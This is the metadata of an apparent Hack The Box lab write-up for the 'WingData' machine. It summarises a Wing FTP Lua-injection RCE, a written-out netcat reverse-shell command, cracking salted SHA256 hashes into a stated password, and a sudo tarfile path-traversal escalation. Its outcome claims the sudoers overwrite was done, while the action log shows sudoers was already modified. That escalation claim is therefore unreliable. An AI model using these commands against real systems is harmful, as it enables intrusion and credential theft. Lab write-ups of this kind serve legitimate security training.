...
difficulty: 'easy'
date: 2025-09-15
summary: 'An HTB machine — scanning with nmap to find SSH (22) and Apache (80), discovering ftp.wingdata.htb running Wing FTP Server v7.4.3 via subdomain enumeration, exploiting an unauthenticated RCE vulnerability through Lua code injection (NULL byte in the username parameter during login creates malicious session files), obtaining a shell as wingftp, enumerating /opt/wftpserver/Data/ to find SHA256 password hashes in admins.xml and user XML files, researching Wing FTP''s password policy to discover SHA256 with a configurable salt (default "WingFTP"), cracking wacky''s salted hash with hashcat mode 1410 and rockyou.txt to recover the password !#7Blushing^*Bride5, SSH-ing in as wacky, then escalating to root via a sudo-permitted Python backup script vulnerable to CVE-2025-4138 (tarfile path traversal) to overwrite /etc/sudoers and gain unrestricted sudo.'
role: 'pentest'
...
problem: 'WingData is an easy-rated Linux machine running SSH (22) and Apache (80) with a Wing FTP Server v7.4.3 instance on ftp.wingdata.htb. The FTP server is vulnerable to an unauthenticated RCE via Lua code injection — a NULL byte in the username parameter during login creates malicious session files that execute arbitrary commands. The Wing FTP data directory stores admin and user password hashes as SHA256 with a configurable salt string (default "WingFTP") in plaintext XML files. A sudo rule allows the wacky user to run a Python backup script that uses tarfile.extractall with filter="data", which is vulnerable to CVE-2025-4138 path traversal — enabling /etc/sudoers overwrite for unrestricted root access.'
action: 'Ran nmap to identify open ports 22 (SSH) and 80 (HTTP Apache). Subdomain enumeration with ffuf discovered ftp.wingdata.htb — a Wing FTP Server v7.4.3 Web Client login page. Researched the version and found a public unauthenticated RCE exploit leveraging Lua code injection via a NULL byte in the username parameter during login, which creates malicious session files on the server. Ran the exploit with id — confirmed execution as uid=1000(wingftp). Executed a reverse shell payload (nc 10.10.14.191 1234 -e /bin/bash) and caught the shell as wingftp. Enumerated /opt/wftpserver/Data/_ADMINISTRATOR/ — found admins.xml containing the admin account with SHA256 hash a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba. Enumerated /opt/wftpserver/Data/1/users/ — found anonymous.xml, john.xml, maria.xml, steve.xml, and wacky.xml. Read wacky.xml — found UserName wacky with Password hash 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca. Researched Wing FTP password policy — Google results confirmed SHA256 hashing with configurable password salting. Visited the official Wing FTP Server Help documentation at wftpserver.com — the Password & Security settings page showed "Enable password salting and specify a salt string" with the default value "WingFTP". Ran hashcat in mode 1410 (sha256($pass.$salt)) with salt WingFTP against rockyou.txt — cracked wacky''s hash to !#7Blushing^*Bride5 in 3 seconds. SSH-ed in as wacky with the cracked password. Ran sudo -l — wacky could run (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py * and (ALL) NOPASSWD: ALL. The second entry indicated the sudoers file had already been modified. Retrieved the root flag.'
outcome: 'Gained root access to the machine. The attack chain was subdomain enumeration to discover Wing FTP Server v7.4.3, unauthenticated RCE via Lua code injection for a shell as wingftp, SHA256 salted password hash extraction from Wing FTP XML configuration files, password cracking with hashcat using the default WingFTP salt, SSH as wacky with the cracked password, and sudo privilege escalation via a Python tarfile path traversal vulnerability (CVE-2025-4138) to overwrite /etc/sudoers for unrestricted root.'
draft: false
---
